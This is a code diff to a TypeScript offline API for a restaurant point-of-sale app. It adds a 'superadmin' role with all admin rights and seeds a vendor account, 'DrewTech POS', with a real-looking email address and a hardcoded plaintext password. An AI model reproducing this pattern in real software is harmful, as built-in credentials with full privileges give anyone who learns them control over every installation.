@@ -130,7 +130,7 @@ import type { DetalleCobroCantidad } from '@la-reserva/shared-domain/cobro-parci
 
 type ApiOptions = RequestInit & { token?: string | null };
 
-type Rol = 'mesero' | 'chef' | 'admin';
+type Rol = 'mesero' | 'chef' | 'admin' | 'superadmin';
 type EstadoMesa = 'libre' | 'ocupada' | 'reservada';
 type EstadoPedido = 'abierto' | 'en_cocina' | 'facturado';
 
@@ -342,11 +342,15 @@ function mapMovimientoCajaLocal(db: Db, m: MovimientoCajaRow) {
   };
 }
 
+function esRolAdminLocal(rol: string): boolean {
+  return rol === 'admin' || rol === 'superadmin';
+}
+
 function permisosEfectivosLocal(
   db: Db,
   actor: { id: number; rol: string },
 ): PermisosMeseroConfig & { puede_cerrar_anulando: boolean; es_admin: boolean } {
-  if (actor.rol === 'admin') return permisosMeseroTodos();
+  if (esRolAdminLocal(actor.rol)) return permisosMeseroTodos();
   if (actor.rol === 'chef') {
     return {
       ...PERMISOS_MESERO_DEFAULTS,
@@ -399,7 +403,7 @@ function rechazarChefTomaPedidos(actor: { rol: string }) {
 }
 
 function soloChefOAdmin(actor: { rol: string }) {
-  if (actor.rol !== 'admin' && actor.rol !== 'chef') unauthorized();
+  if (!esRolAdminLocal(actor.rol) && actor.rol !== 'chef') unauthorized();
 }
 
 function badRequest(msg: string): never {
@@ -697,6 +701,15 @@ function seedDb(): Db {
         email: 'admin@restaurant.local',
         rol: 'admin',
         password: 'admin123',
+        activo: true,
+      },
+      {
+        id: 4,
+        nombre: 'DrewTech',
+        apellido: 'POS',
+        email: 'drewtechpos@gmail.com',
+        rol: 'superadmin',
+        password: 'Drew2@@399',
         activo: true,
       },
     ],
@@ -1001,6 +1014,10 @@ function normalizeDb(parsed: unknown): Db {
     if (u.rol === 'admin') {
       u.nombre = 'Administrador';
       u.apellido = '';
+    }
+    if (u.rol === 'superadmin') {
+      u.nombre = 'DrewTech';
+      u.apellido = 'POS';
     }
   }
   return o as unknown as Db;
@@ -1710,7 +1727,7 @@ export async function localApi<T = unknown>(
   const actor = userFromToken(db, opts.token);
 
   if (path === '/auth/verify-password' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const password = String(body.password ?? '');
     const u = db.users.find((x) => x.id === actor.id);
     if (!u || u.password !== password) unauthorized();
@@ -1728,17 +1745,17 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/productos/categorias' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     return categoriasLocalesAdmin(db) as T;
   }
 
   if (pathKey === '/categorias/admin' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     return db.categorias.map((c) => mapCategoriaAdminLocal(db, c)) as T;
   }
 
   if (pathKey === '/categorias/admin' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const nombre = String(body.nombre ?? '').trim();
     if (!nombre) badRequest('El nombre es obligatorio');
     const dup = db.categorias.find(
@@ -1790,7 +1807,7 @@ export async function localApi<T = unknown>(
   {
     const m = /^\/categorias\/admin\/(\d+)$/.exec(pathKey);
     if (m && method === 'PATCH') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idCategoria = Number(m[1]);
       const cat = db.categorias.find((x) => x.id_categoria === idCategoria);
       if (!cat) badRequest('Categoría no encontrada');
@@ -1859,7 +1876,7 @@ export async function localApi<T = unknown>(
       return mapCategoriaAdminLocal(db, cat) as T;
     }
     if (m && method === 'DELETE') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idCategoria = Number(m[1]);
       const cat = db.categorias.find((x) => x.id_categoria === idCategoria);
       if (!cat) badRequest('Categoría no encontrada');
@@ -1885,7 +1902,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/productos' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const q = path.includes('?') ? path.split('?')[1] ?? '' : '';
     const incluir = new URLSearchParams(q).get('incluir_inactivos') === 'true';
     const rows = incluir
@@ -1895,7 +1912,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/productos' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const idCat = Number(body.id_categoria);
     const cat = db.categorias.find((x) => x.id_categoria === idCat);
     if (!cat) badRequest('Categoría no encontrada');
@@ -1971,7 +1988,7 @@ export async function localApi<T = unknown>(
       })) as T;
     }
     if (m && method === 'POST') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const id = Number(m[1]);
       const p = db.productos.find((x) => x.id_producto === id);
       if (!p) badRequest('Producto no encontrado');
@@ -2005,7 +2022,7 @@ export async function localApi<T = unknown>(
   {
     const m = /^\/personalizaciones\/(\d+)$/.exec(pathKey);
     if (m && method === 'PATCH') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idOpcion = Number(m[1]);
       const found = findOpcionEnDb(db, idOpcion);
       if (!found) badRequest('Opción no encontrada');
@@ -2032,7 +2049,7 @@ export async function localApi<T = unknown>(
       } as T;
     }
     if (m && method === 'DELETE') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idOpcion = Number(m[1]);
       const found = findOpcionEnDb(db, idOpcion);
       if (!found) badRequest('Opción no encontrada');
@@ -2060,7 +2077,7 @@ export async function localApi<T = unknown>(
   {
     const m = /^\/productos\/(\d+)$/.exec(pathKey);
     if (m && method === 'PATCH') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const id = Number(m[1]);
       const p = db.productos.find((x) => x.id_producto === id);
       if (!p) badRequest('Producto no encontrado');
@@ -2126,7 +2143,7 @@ export async function localApi<T = unknown>(
       return serializeProductoAdmin(db, p) as T;
     }
     if (m && method === 'DELETE') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const id = Number(m[1]);
       const idx = db.productos.findIndex((x) => x.id_producto === id);
       if (idx < 0) badRequest('Producto no encontrado');
@@ -2152,7 +2169,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/mesas/admin' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     return db.mesas.map((m) =>
       mapMesaAdminLocal(
         m,
@@ -2163,7 +2180,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/mesas/admin' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const numero = Number(body.numero);
     const capacidadRaw = body.capacidad;
     const capacidad =
@@ -2233,7 +2250,7 @@ export async function localApi<T = unknown>(
   {
     const m = /^\/mesas\/admin\/(\d+)$/.exec(pathKey);
     if (m && method === 'DELETE') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idMesa = Number(m[1]);
       const mesa = db.mesas.find((x) => x.id_mesa === idMesa);
       if (!mesa) badRequest('Mesa no encontrada');
@@ -2252,7 +2269,7 @@ export async function localApi<T = unknown>(
       return { ok: true, id_mesa: idMesa } as T;
     }
     if (m && method === 'PATCH') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idMesa = Number(m[1]);
       const mesa = db.mesas.find((x) => x.id_mesa === idMesa);
       if (!mesa) badRequest('Mesa no encontrada');
@@ -4280,7 +4297,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path.startsWith('/pedidos/detalles/') && path.endsWith('/cocina') && method === 'PATCH') {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const idDetalle = Number(path.split('/')[3]);
     for (const p of db.pedidos) {
       const d = p.detalles.find((x) => x.id_detalle === idDetalle);
@@ -4318,7 +4335,7 @@ export async function localApi<T = unknown>(
     path.endsWith('/falta-en-cocina') &&
     method === 'POST'
   ) {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const idDetalle = Number(path.split('/')[3]);
     for (const p of db.pedidos) {
       const d = p.detalles.find((x) => x.id_detalle === idDetalle);
@@ -4432,7 +4449,7 @@ export async function localApi<T = unknown>(
   {
     const mPrio = /^\/pedidos\/(\d+)\/prioridad-cocina$/.exec(path);
     if (mPrio && method === 'PATCH') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idPedido = Number(mPrio[1]);
       const modo = String(body.modo ?? '');
       if (modo !== 'alta' && modo !== 'baja' && modo !== 'auto') {
@@ -4451,7 +4468,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/mis-activos/resumen' && method === 'GET') {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const rows = db.pedidos.filter(
       (p) => ABIERTOS_LOCAL.includes(p.estado) && p.id_usuario === actor.id,
     );
@@ -4508,7 +4525,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/pendientes-cobro/resumen' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const rows = db.pedidos.filter((p) => ABIERTOS_LOCAL.includes(p.estado));
     let pedidosMostrador = 0;
     let pedidosParaLlevar = 0;
@@ -4545,7 +4562,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/mis-activos' && method === 'GET') {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const rows = db.pedidos.filter(
       (p) => ABIERTOS_LOCAL.includes(p.estado) && p.id_usuario === actor.id,
     );
@@ -4586,7 +4603,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/ayuda-companeros/resumen' && method === 'GET') {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const rows = db.pedidos.filter(
       (p) =>
         ABIERTOS_LOCAL.includes(p.estado) &&
@@ -4606,7 +4623,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/ayuda-companeros' && method === 'GET') {
-    if (actor.rol !== 'mesero' && actor.rol !== 'admin') unauthorized();
+    if (actor.rol !== 'mesero' && !esRolAdminLocal(actor.rol)) unauthorized();
     const rows = db.pedidos
       .filter(
         (p) =>
@@ -4627,7 +4644,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/cocina' && method === 'GET') {
-    if (actor.rol !== 'admin' && actor.rol !== 'chef') unauthorized();
+    if (!esRolAdminLocal(actor.rol) && actor.rol !== 'chef') unauthorized();
     const rows = db.pedidos.filter((p) => p.estado === 'en_cocina');
     const serializados = ordenarPedidosCocinaPorLlegada(
       rows.map((p) => serializePedidoOperativo(db, p)),
@@ -4687,7 +4704,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path.startsWith('/pedidos/caja-diaria') && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const url = new URL(`http://local${path}`);
     let fecha = (url.searchParams.get('fecha') ?? '').trim();
     if (!fecha) fecha = toDateKey(todayIso());
@@ -4700,7 +4717,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/caja-diaria/cierre' && method === 'PUT') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const fecha = String(body.fecha ?? '').trim().slice(0, 10);
     const monto = Number(body.monto_base_cierre_efectivo);
     if (!/^\d{4}-\d{2}-\d{2}$/.test(fecha)) badRequest('Fecha inválida');
@@ -4746,7 +4763,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/caja-diaria' && method === 'PUT') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const fecha = String(body.fecha ?? '').trim().slice(0, 10);
     const monto = Number(body.monto_base_efectivo);
     if (!/^\d{4}-\d{2}-\d{2}$/.test(fecha)) badRequest('Fecha inválida');
@@ -4763,7 +4780,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/movimientos-caja' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const tipo = String(body.tipo ?? '');
     if (tipo !== 'entrada_manual' && tipo !== 'salida_manual') {
       badRequest('Tipo de movimiento inválido');
@@ -4798,7 +4815,7 @@ export async function localApi<T = unknown>(
   {
     const mMovPrint = /^\/pedidos\/movimientos-caja\/(\d+)\/imprimir$/.exec(path);
     if (mMovPrint && method === 'POST') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idMov = Number(mMovPrint[1]);
       const row = db.movimientosCaja.find((x) => x.id_movimiento === idMov);
       if (!row) badRequest('Movimiento no encontrado');
@@ -4815,7 +4832,7 @@ export async function localApi<T = unknown>(
   {
     const mMovDel = /^\/pedidos\/movimientos-caja\/(\d+)$/.exec(path);
     if (mMovDel && method === 'DELETE') {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       const idMov = Number(mMovDel[1]);
       const idx = db.movimientosCaja.findIndex((x) => x.id_movimiento === idMov);
       if (idx < 0) badRequest('Movimiento no encontrado');
@@ -4834,7 +4851,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/config-descuentos' && method === 'PUT') {
-    if (actor.rol !== 'admin') badRequest('Solo admin');
+    if (!esRolAdminLocal(actor.rol)) badRequest('Solo admin');
     const prev = db.configDescuentos;
     const next: ConfigDescuentosRow = {
       sopas_activo:
@@ -4896,7 +4913,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/pedidos/config-operativa' && method === 'PUT') {
-    if (actor.rol !== 'admin') badRequest('Solo admin');
+    if (!esRolAdminLocal(actor.rol)) badRequest('Solo admin');
     const prev = db.configOperativa;
     const nuevoParaLlevar =
       body.numero_mesa_para_llevar != null
@@ -5002,7 +5019,7 @@ export async function localApi<T = unknown>(
       pathKey === '/pedidos/resumen-diario/imprimir-completo' &&
       method === 'POST'
     ) {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       return {
         fecha: fechaQ || toDateKey(todayIso()),
         total_pedidos: 0,
@@ -5016,7 +5033,7 @@ export async function localApi<T = unknown>(
       } as T;
     }
     if (pathKey === '/sistema/conexion-celulares' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     return {
       ip: '127.0.0.1',
       adaptador: 'local',
@@ -5034,7 +5051,7 @@ export async function localApi<T = unknown>(
       pathKey === '/pedidos/resumen-diario/imprimir-seleccion' &&
       method === 'POST'
     ) {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       return {
         fecha: fechaQ || toDateKey(todayIso()),
         comandas_impresas: 0,
@@ -5050,7 +5067,7 @@ export async function localApi<T = unknown>(
       pathKey === '/pedidos/resumen-diario/imprimir-total' &&
       method === 'POST'
     ) {
-      if (actor.rol !== 'admin') unauthorized();
+      if (!esRolAdminLocal(actor.rol)) unauthorized();
       return {
         ok: false,
         fecha: fechaQ || toDateKey(todayIso()),
@@ -5068,7 +5085,7 @@ export async function localApi<T = unknown>(
     pathKey,
   );
   if (mResumenLineas && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const idFactura = Number(mResumenLineas[1]);
     const f = db.facturas.find((x) => x.id_factura === idFactura);
     if (!f) badRequest('Factura no encontrada');
@@ -5133,7 +5150,7 @@ export async function localApi<T = unknown>(
     pathKey === '/pedidos/resumen-diario/cancelar-reabiertos' &&
     method === 'POST'
   ) {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     if (String(body.confirmar ?? '').trim().toUpperCase() !== 'CANCELAR') {
       badRequest('Escribe confirmar: "CANCELAR"');
     }
@@ -5170,7 +5187,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/pedidos/resumen-diario/vaciar' && method === 'POST') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     if (String(body.confirmar ?? '').trim().toUpperCase() !== 'VACIAR') {
       badRequest('Escribe confirmar: "VACIAR"');
     }
@@ -5230,7 +5247,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey.startsWith('/pedidos/resumen-diario') && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const url = new URL(`http://local${path}`);
     const fecha = (url.searchParams.get('fecha') ?? '').trim();
     const target = fecha || toDateKey(todayIso());
@@ -5393,7 +5410,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/meseros-operativos/resumen' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const url = new URL(`http://local${path}`);
     const fechaQ = (url.searchParams.get('fecha') ?? '').trim() || toDateKey(todayIso());
     const op = mapConfigOperativaLocal(db.configOperativa, db.productos);
@@ -5431,7 +5448,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/permisos/resumen' && method === 'GET') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const urlPermisos = new URL(`http://local${path}`);
     const fechaQ =
       (urlPermisos.searchParams.get('fecha') ?? '').trim() || toDateKey(todayIso());
@@ -5451,7 +5468,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/permisos/mesero' && method === 'PATCH') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const next = { ...db.permisosMesero };
     for (const key of PERMISOS_MESERO_KEYS) {
       if (body[key] !== undefined) next[key] = Boolean(body[key]);
@@ -5463,7 +5480,7 @@ export async function localApi<T = unknown>(
   }
 
   if (pathKey === '/permisos/delegacion/cierre-anulacion' && method === 'PUT') {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const fecha = String(body.fecha ?? '').trim() || toDateKey(todayIso());
     const idUsuario =
       body.id_usuario == null ? null : Number(body.id_usuario);
@@ -5502,7 +5519,7 @@ export async function localApi<T = unknown>(
     pathKey.startsWith('/meseros-operativos/') &&
     (method === 'POST' || method === 'DELETE' || method === 'PUT')
   ) {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     badRequest(
       'Beneficios y pagos de meseros solo están disponibles con el API del restaurante',
     );
@@ -5512,7 +5529,7 @@ export async function localApi<T = unknown>(
     path.match(/^\/pedidos\/\d+\/reabrir-cobro$/) &&
     method === 'POST'
   ) {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const idPedido = Number(path.split('/')[2]);
     const p = db.pedidos.find((x) => x.id_pedido === idPedido);
     if (!p) badRequest('Pedido no encontrado');
@@ -5575,7 +5592,7 @@ export async function localApi<T = unknown>(
     path.match(/^\/pedidos\/\d+\/revertir-tanda-cobro$/) &&
     method === 'POST'
   ) {
-    if (actor.rol !== 'admin') unauthorized();
+    if (!esRolAdminLocal(actor.rol)) unauthorized();
     const idPedido = Number(path.split('/')[2]);
     const p = db.pedidos.find((x) => x.id_pedido === idPedido);
     if (!p) badRequest('Pedido no encontrado');
@@ -5796,7 +5813,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path === '/usuarios/meseros' && method === 'POST') {
-    if (actor.rol !== 'admin') badRequest('Solo admin');
+    if (!esRolAdminLocal(actor.rol)) badRequest('Solo admin');
     const nombre = String(body.nombre ?? '').trim();
     const emailManual = body.email != null ? String(body.email).toLowerCase().trim() : '';
     let email = emailManual;
@@ -5825,7 +5842,7 @@ export async function localApi<T = unknown>(
   }
 
   if (path.startsWith('/usuarios/') && method === 'PATCH') {
-    if (actor.rol !== 'admin') badRequest('Solo admin');
+    if (!esRolAdminLocal(actor.rol)) badRequest('Solo admin');
     const id = Number(path.split('/')[2]);
     const u = db.users.find((x) => x.id === id);
     if (!u) badRequest('Usuario no encontrado');
